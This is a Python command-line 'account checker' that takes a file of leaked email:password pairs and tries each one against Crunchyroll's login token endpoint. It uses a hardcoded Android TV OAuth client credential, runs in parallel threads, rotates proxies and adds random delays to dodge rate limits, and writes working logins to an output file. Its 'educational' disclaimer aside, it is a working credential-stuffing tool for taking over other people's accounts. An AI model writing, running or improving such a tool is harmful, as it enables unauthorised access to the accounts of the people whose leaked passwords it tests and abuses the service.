"""
Crunchyroll account checker (CLI).

POST https://beta-api.crunchyroll.com/auth/v1/token with grant_type=password using
Android TV OAuth client headers (password grant is rejected for many mobile client IDs).

For personal / educational testing only. Automated checks may hit rate limits or blocks.
"""

from __future__ import annotations

import argparse
import json
import os
import random
import sys
import time
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from enum import Enum
from typing import Callable, Dict, Iterable, List, Optional

import requests
from colorama import Fore, Style, init

init(autoreset=False)

# Android TV client: password grant works on beta-api. Mobile app credentials often return unsupported_grant_type.
# If invalid_client: refresh Basic token (crextractor credentials.tv.json) or set CRUNCHYROLL_AUTH.
DEFAULT_AUTH_HEADER = (
    "Basic bzd1b3d5N3E0bGdsdGJhdnloanE6bHFyakVUTng2Vzd1Um5wY0RtOHdSVmo4QkNoakMxZXI="
)
TOKEN_URL = "https://beta-api.crunchyroll.com/auth/v1/token"
APP_VERSION = "3.58.0"
ANDROID_TV_BUILD = "22336"
REQUEST_TIMEOUT = 30

USER_AGENTS = [
    f"Crunchyroll/{APP_VERSION} ANDROIDTV/{ANDROID_TV_BUILD}",
]


def _authorization_header() -> str:
    return os.environ.get("CRUNCHYROLL_AUTH", DEFAULT_AUTH_HEADER).strip()


class CheckStatus(str, Enum):
    VALID = "valid"
    INVALID = "invalid"
    ERROR = "error"
    BAD_FORMAT = "bad_format"


@dataclass(frozen=True)
class CheckResult:
    status: CheckStatus
    email: str
    password: str
    message: str = ""

    @property
    def combo(self) -> str:
        return f"{self.email}:{self.password}"


def print_banner() -> None:
    banner = f"""
{Fore.GREEN}╔═══════════════════════════════════════════════════╗
║                                                   ║
║   Crunchyroll Account Checker                     ║
║   Educational / personal use only                 ║
║                                                   ║
╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}
    """
    print(banner)


def _normalize_proxy_url(url: str) -> str:
    u = url.strip()
    if not u:
        return ""
    if "://" not in u:
        u = f"http://{u}"
    return u


def check_credentials(
    email: str,
    password: str,
    proxies: Optional[Dict[str, str]] = None,
    extra_delay: float = 0.0,
) -> CheckResult:
    """
    POST auth/v1/token with grant_type=password (Crunchyroll beta API).
    ``proxies`` is passed to requests (e.g. {"http": "http://host:port", "https": "http://host:port"}).
    """
    email = email.strip()
    password = password.strip()
    if not email or not password:
        return CheckResult(CheckStatus.BAD_FORMAT, email, password, "empty email or password")

    device_id = str(uuid.uuid4())
    payload = {
        "username": email,
        "password": password,
        "grant_type": "password",
        "scope": "offline_access",
        "device_id": device_id,
        "device_name": "Android TV",
        "device_type": "Android TV",
    }
    auth = _authorization_header()
    if not auth.lower().startswith("basic "):
        auth = f"Basic {auth}"

    headers = {
        "Authorization": auth,
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json",
    }

    try:
        response = requests.post(
            TOKEN_URL,
            data=payload,
            headers=headers,
            timeout=REQUEST_TIMEOUT,
            proxies=proxies,
        )
    except requests.RequestException as e:
        return CheckResult(CheckStatus.ERROR, email, password, str(e))

    time.sleep(random.uniform(0.4, 1.2) + max(0.0, extra_delay))

    if response.status_code == 429:
        return CheckResult(
            CheckStatus.ERROR,
            email,
            password,
            "HTTP 429 Too Many Requests (slow down: -t 1, --delay 5, or --proxy / --proxies-file)",
        )

    try:
        body = response.json()
    except (json.JSONDecodeError, ValueError):
        return CheckResult(
            CheckStatus.ERROR,
            email,
            password,
            f"non-JSON response HTTP {response.status_code}",
        )

    if response.status_code == 200 and isinstance(body, dict) and body.get("access_token"):
        return CheckResult(CheckStatus.VALID, email, password)

    err = ""
    if isinstance(body, dict):
        err = str(body.get("error") or body.get("error_code") or "")
        code = str(body.get("code") or "")
        hint = body.get("error_description") or body.get("message")
        parts = [p for p in (err, code, hint) if p]
        err = " | ".join(parts) if parts else str(body)

    low = (err or "").lower()
    if "invalid_client" in low or "client_inactive" in low:
        return CheckResult(
            CheckStatus.ERROR,
            email,
            password,
            "invalid_client (update CRUNCHYROLL_AUTH - see bot.py header comment)",
        )

    if "unsupported_grant_type" in low:
        return CheckResult(
            CheckStatus.ERROR,
            email,
            password,
            "unsupported_grant_type (wrong OAuth client; this script expects Android TV credentials)",
        )

    if (
        any(x in low for x in ("invalid_grant", "invalid_credentials", "incorrect"))
        or "invalid_credentials" in low
        or response.status_code == 401
    ):
        return CheckResult(CheckStatus.INVALID, email, password, err or f"HTTP {response.status_code}")

    if response.status_code >= 500 or "cloudflare" in str(body).lower():
        return CheckResult(
            CheckStatus.ERROR,
            email,
            password,
            err or f"HTTP {response.status_code} (server or protection)",
        )

    return CheckResult(CheckStatus.INVALID, email, password, err or f"HTTP {response.status_code}")


def check_combo_line(
    line: str,
    proxy_urls: Optional[List[str]] = None,
    extra_delay: float = 0.0,
) -> CheckResult:
    line = line.strip()
    if ":" not in line:
        return CheckResult(CheckStatus.BAD_FORMAT, "", "", f"invalid format: {line!r}")
    email, password = line.split(":", 1)
    proxies: Optional[Dict[str, str]] = None
    if proxy_urls:
        cleaned = [_normalize_proxy_url(u) for u in proxy_urls if _normalize_proxy_url(u)]
        if cleaned:
            u = random.choice(cleaned)
            proxies = {"http": u, "https": u}
    return check_credentials(email, password, proxies=proxies, extra_delay=extra_delay)


@dataclass
class RunSummary:
    total: int
    valid: int
    invalid: int
    errors: int
    bad_format: int
    seconds: float
    valid_lines: List[str]


def run_checks(
    combos: Iterable[str],
    max_workers: int,
    on_result: Optional[Callable[[CheckResult], None]] = None,
    proxy_urls: Optional[List[str]] = None,
    extra_delay: float = 0.0,
) -> RunSummary:
    combos_list = [c for c in combos if c and str(c).strip()]
    valid_lines: List[str] = []
    counts = {CheckStatus.VALID: 0, CheckStatus.INVALID: 0, CheckStatus.ERROR: 0, CheckStatus.BAD_FORMAT: 0}

    start = time.perf_counter()
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {
            executor.submit(check_combo_line, line, proxy_urls, extra_delay): line
            for line in combos_list
        }
        for fut in as_completed(futures):
            result = fut.result()
            counts[result.status] = counts.get(result.status, 0) + 1
            if result.status == CheckStatus.VALID:
                valid_lines.append(result.combo)
            if on_result:
                on_result(result)

    elapsed = time.perf_counter() - start
    return RunSummary(
        total=len(combos_list),
        valid=counts[CheckStatus.VALID],
        invalid=counts[CheckStatus.INVALID],
        errors=counts[CheckStatus.ERROR],
        bad_format=counts[CheckStatus.BAD_FORMAT],
        seconds=elapsed,
        valid_lines=valid_lines,
    )


def run_checks_collecting(
    combos: Iterable[str],
    max_workers: int,
    proxy_urls: Optional[List[str]] = None,
    extra_delay: float = 0.0,
) -> tuple[RunSummary, List[CheckResult]]:
    """Same as run_checks but returns every CheckResult (completion order)."""
    collected: List[CheckResult] = []

    def on_result(r: CheckResult) -> None:
        collected.append(r)

    summary = run_checks(
        combos,
        max_workers,
        on_result=on_result,
        proxy_urls=proxy_urls,
        extra_delay=extra_delay,
    )
    return summary, collected


def check_result_to_dict(r: CheckResult) -> dict:
    return {
        "status": r.status.value,
        "email": r.email,
        "password": r.password,
        "message": r.message,
        "combo": r.combo,
    }


def format_result_line(result: CheckResult) -> str:
    if result.status == CheckStatus.BAD_FORMAT:
        return f"{Fore.YELLOW}[WARN] {result.message}{Style.RESET_ALL}"
    if result.status == CheckStatus.ERROR:
        return f"{Fore.YELLOW}[ERROR] {result.email}:{result.password} - {result.message}{Style.RESET_ALL}"
    if result.status == CheckStatus.VALID:
        return f"{Fore.GREEN}[VALID] {result.combo}{Style.RESET_ALL}"
    extra = f" ({result.message})" if result.message else ""
    return f"{Fore.RED}[INVALID] {result.combo}{extra}{Style.RESET_ALL}"


def write_valid_file(path: str, lines: List[str]) -> None:
    directory = os.path.dirname(os.path.abspath(path))
    if directory:
        os.makedirs(directory, exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        for line in lines:
            f.write(line + "\n")


def parse_args(argv: Optional[List[str]] = None) -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Crunchyroll combo checker (educational).")
    p.add_argument(
        "-c",
        "--combo",
        metavar="FILE",
        help="Path to combo file (email:password per line). If omitted, you will be prompted.",
    )
    p.add_argument(
        "-t",
        "--threads",
        type=int,
        default=5,
        help="Worker threads (1-10). Default: 5",
    )
    p.add_argument(
        "-o",
        "--output",
        default="valid_crunchyroll.txt",
        help="Output file for valid hits. Default: valid_crunchyroll.txt",
    )
    p.add_argument(
        "-q",
        "--quiet",
        action="store_true",
        help="Only print summary (no per-line output).",
    )
    p.add_argument("--no-banner", action="store_true", help="Skip ASCII banner.")
    p.add_argument(
        "--proxy",
        action="append",
        dest="proxies",
        metavar="URL",
        help="HTTP(S) proxy URL (repeat for multiple). Example: http://user:pass@host:8080",
    )
    p.add_argument(
        "--proxies-file",
        metavar="FILE",
        help="File with one proxy URL per line (rotates randomly per request).",
    )
    p.add_argument(
        "--delay",
        type=float,
        default=0.0,
        metavar="SEC",
        help="Extra seconds to wait after each request (helps with 429). Default: 0",
    )
    return p.parse_args(argv)


def main(argv: Optional[List[str]] = None) -> int:
    args = parse_args(argv)

    if not args.no_banner:
        print_banner()

    combo_file = args.combo
    if not combo_file:
        combo_file = input(
            f"{Fore.CYAN}Enter the path to your combo file (email:password): {Style.RESET_ALL}"
        ).strip()

    if not combo_file or not os.path.isfile(combo_file):
        print(f"{Fore.RED}[ERROR] File not found: {combo_file!r}{Style.RESET_ALL}")
        return 1

    with open(combo_file, "r", encoding="utf-8", errors="replace") as f:
        combos = [line.strip() for line in f if line.strip()]

    threads = max(1, min(10, args.threads))

    proxy_urls: List[str] = list(args.proxies or [])
    if args.proxies_file:
        if not os.path.isfile(args.proxies_file):
            print(f"{Fore.RED}[ERROR] Proxies file not found: {args.proxies_file!r}{Style.RESET_ALL}")
            return 1
        with open(args.proxies_file, "r", encoding="utf-8", errors="replace") as pf:
            proxy_urls.extend(line.strip() for line in pf if line.strip())

    proxy_urls = [u for u in proxy_urls if u.strip()]
    if proxy_urls:
        print(f"{Fore.BLUE}[INFO] Using {len(proxy_urls)} proxy URL(s){Style.RESET_ALL}")
    if args.delay > 0:
        print(f"{Fore.BLUE}[INFO] Extra delay after each check: {args.delay}s{Style.RESET_ALL}")

    print(f"{Fore.BLUE}[INFO] Loaded {len(combos)} lines - using {threads} threads{Style.RESET_ALL}")

    def on_result(result: CheckResult) -> None:
        if not args.quiet:
            print(format_result_line(result))

    summary = run_checks(
        combos,
        threads,
        on_result=on_result,
        proxy_urls=proxy_urls or None,
        extra_delay=args.delay,
    )

    if summary.valid_lines:
        write_valid_file(args.output, summary.valid_lines)

    print(f"\n{Fore.BLUE}=== Summary ==={Style.RESET_ALL}")
    print(f"{Fore.BLUE}Total lines: {summary.total}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}Valid: {summary.valid}{Style.RESET_ALL}")
    print(f"{Fore.RED}Invalid: {summary.invalid}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Errors (network/timeout): {summary.errors}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Bad format: {summary.bad_format}{Style.RESET_ALL}")
    print(f"{Fore.BLUE}Time: {summary.seconds:.2f}s{Style.RESET_ALL}")
    if summary.valid:
        print(f"{Fore.GREEN}Saved {summary.valid} to {args.output}{Style.RESET_ALL}")

    return 0


if __name__ == "__main__":
    sys.exit(main())
